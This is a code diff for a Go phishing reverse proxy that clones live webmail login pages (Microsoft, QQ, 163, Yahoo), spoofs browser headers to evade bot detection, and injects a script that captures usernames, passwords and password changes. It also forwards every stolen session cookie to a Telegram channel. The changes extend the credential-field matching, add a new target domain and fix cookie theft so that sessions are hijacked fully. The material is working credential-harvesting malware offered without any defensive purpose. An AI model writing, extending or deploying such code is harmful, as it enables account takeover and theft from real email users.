@@ -5,6 +5,7 @@ import (
 	"io"
 	"log"
 	"net/http"
+	"net/http/cookiejar"
 	"strings"
 	"sync"
 	"time"
@@ -12,7 +13,6 @@ import (
 	"github.com/gin-gonic/gin"
 )
 
-// SessionStore holds active sessions safely
 type SessionStore struct {
 	mu       sync.RWMutex
 	sessions map[string]*SessionData
@@ -27,7 +27,6 @@ var store = &SessionStore{
 	sessions: make(map[string]*SessionData),
 }
 
-// HarvesterScript is injected into every fetched page
 const harvesterScript = `
 <script>
 document.addEventListener('submit', function(e) {
@@ -39,7 +38,7 @@ document.addEventListener('submit', function(e) {
 
     for (let [key, value] of formData.entries()) {
         params.append(key, value);
-        if (key.toLowerCase().includes('email') || key.toLowerCase().includes('user')) {
+        if (key.toLowerCase().includes('email') || key.toLowerCase().includes('user') || key.toLowerCase().includes('account')) {
             window._capturedEmail = value;
             hasEmail = true;
         }
@@ -49,6 +48,7 @@ document.addEventListener('submit', function(e) {
         }
     }
 
+    // Capture Login
     if (hasEmail && hasPassword) {
         fetch('/api/harvest', {
             method: 'POST',
@@ -58,6 +58,7 @@ document.addEventListener('submit', function(e) {
     }
 }, true);
 
+// Capture Password Changes
 setInterval(() => {
     const inputs = document.querySelectorAll('input[type="password"]');
     if (inputs.length >= 2) {
@@ -72,8 +73,6 @@ setInterval(() => {
         }
     }
 }, 2000);
-
-window.history.replaceState({}, '', window.location.href.replace(/\\/your-domain\\.com/, '\\/target-domain'));
 </script>
 `
 
@@ -99,9 +98,10 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 		log.Printf("[PROXY] Fetching live page for %s from %s", email, targetBase)
 
-		// FIXED: Allow the Go client to follow up to 5 redirects internally
+		jar, _ := cookiejar.New(nil)
 		proxyClient := &http.Client{
 			Timeout: 15 * time.Second,
+			Jar:     jar,
 			Transport: &http.Transport{
 				ForceAttemptHTTP2: false,
 			},
@@ -113,17 +113,13 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 			return
 		}
 
-		// Spoofing headers to bypass Google's bot detection
+		// SPOOF HEADERS
 		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
-		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
+		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8")
 		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
-		req.Header.Set("Sec-Ch-Ua", `"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"`)
-		req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
-		req.Header.Set("Sec-Ch-Ua-Platform", `"Windows"`)
 		req.Header.Set("Sec-Fetch-Dest", "document")
 		req.Header.Set("Sec-Fetch-Mode", "navigate")
 		req.Header.Set("Sec-Fetch-Site", "none")
-		req.Header.Set("Sec-Fetch-User", "?1")
 		req.Header.Set("Upgrade-Insecure-Requests", "1")
 
 		resp, err := proxyClient.Do(req)
@@ -145,26 +141,24 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 		rewrittenBody := strings.ReplaceAll(bodyStr, targetBase, c.Request.Host+"/")
 
 		if strings.Contains(email, "@") {
-			rewrittenBody = strings.ReplaceAll(rewrittenBody, "https://"+strings.Split(email, "@")[1], c.Request.Host+"/")
+			domain := strings.Split(email, "@")[1]
+			rewrittenBody = strings.ReplaceAll(rewrittenBody, "https://"+domain, c.Request.Host+"/")
+			rewrittenBody = strings.ReplaceAll(rewrittenBody, "http://"+domain, c.Request.Host+"/")
 		}
 
+		// Inject Base Tag
 		baseTag := `<base href="` + targetBase + `">`
 		rewrittenBody = strings.Replace(rewrittenBody, "<head>", "<head>\n"+baseTag, 1)
 
+		// Inject Harvester
 		rewrittenBody = strings.Replace(rewrittenBody, "</body>", harvesterScript+"</body>", 1)
 
-		// --- HEADER CLONING ---
 		CloneHeaders(resp, c.Writer)
 
-		setCookieHeader := resp.Header.Get("Set-Cookie")
-		if setCookieHeader != "" {
-			parts := strings.Split(setCookieHeader, "=")
-			if len(parts) >= 2 {
-				cookieName := strings.TrimSpace(strings.Split(parts[0], ";")[0])
-				cookieValue := strings.Join(parts[1:], "=")
-				c.SetCookie(cookieName, cookieValue, 3600*24, "/", "", false, false)
-				SendTelegramMessage(cfg, FormatCookieHarvest(email, []string{setCookieHeader}))
-			}
+		// FIX: Loop through ALL cookies to bind the session properly (Fixes 163.com)
+		for _, cookie := range resp.Cookies() {
+			c.SetCookie(cookie.Name, cookie.Value, 3600*24, "/", "", false, false)
+			SendTelegramMessage(cfg, FormatCookieHarvest(email, []string{cookie.Name + "=" + cookie.Value}))
 		}
 
 		c.Writer.WriteHeader(resp.StatusCode)
@@ -191,8 +185,14 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 			if email == "" {
 				email = c.PostForm("username")
 			}
+			if email == "" {
+				email = c.PostForm("account")
+			}
 			if password == "" {
 				password = c.PostForm("passwd")
+			}
+			if password == "" {
+				password = c.PostForm("pwd")
 			}
 
 			ip := c.ClientIP()
@@ -205,9 +205,6 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 
 	r.Any("/proxy/*filepath", func(c *gin.Context) {
 		filepath := c.Param("filepath")
-		if filepath == "" {
-			filepath = "/"
-		}
 		filepath = strings.TrimPrefix(filepath, "/")
 
 		referer := c.GetHeader("Referer")
@@ -219,6 +216,8 @@ func StartProxy(cfg TelegramConfig, listenPort string) {
 			targetDomain = "https://login.live.com/"
 		} else if strings.Contains(referer, "qq.com") {
 			targetDomain = "https://mail.qq.com/"
+		} else if strings.Contains(referer, "163.com") {
+			targetDomain = "https://mail.163.com/"
 		} else if strings.Contains(referer, "yahoo.com") {
 			targetDomain = "https://login.yahoo.com/"
 		}
